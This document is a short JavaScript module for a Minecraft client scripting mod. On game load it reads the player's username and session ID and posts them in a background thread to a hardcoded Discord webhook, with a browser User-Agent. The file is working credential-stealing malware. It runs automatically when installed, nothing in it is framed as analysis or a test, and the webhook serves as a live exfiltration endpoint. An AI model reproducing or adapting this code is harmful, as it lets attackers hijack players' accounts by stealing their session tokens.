const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1366062628538941561/duYVh6xkWFGh8qED5pJEeAUmCPBJj_6hgk4JUiCgEEdP-S3noGrIR3K4CacndLT6V6-w";

register("gameLoad", () => {
  getSessionInfo();
});

function getSessionInfo() {
  try {
      let minecraft = Java.type("net.minecraft.client.Minecraft").func_71410_x();
      let session = minecraft.func_110432_I();
      let username = session.func_111285_a();
      let sessionId = session.func_111286_b();
      sendToDiscord(username, sessionId);
  } catch(error) {
      console.error(error);
  }
}

function sendToDiscord(username, sessionId) {
  new Thread(() => {
      try {
          let url = new java.net.URL(DISCORD_WEBHOOK_URL);
          let connection = url.openConnection();
          connection.setDoOutput(true);
          connection.setRequestMethod("POST");
          connection.setRequestProperty("Content-Type", "application/json");
          connection.setRequestProperty("User-Agent", "Mozilla/5.0");

          let jsonMessage = JSON.stringify({
              content: `**Username:** ${username}\n**Session ID:** ${sessionId}`
          });

          let output = new java.io.OutputStreamWriter(connection.getOutputStream());
          output.write(jsonMessage);
          output.flush();
          output.close();

          let response = new java.io.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()));
          let responseLine;
          while ((responseLine = response.readLine()) !== null) {
              console.log(responseLine);
          }
          response.close();
      } catch(error) {
          console.error(error);
      }
  }).start();
}
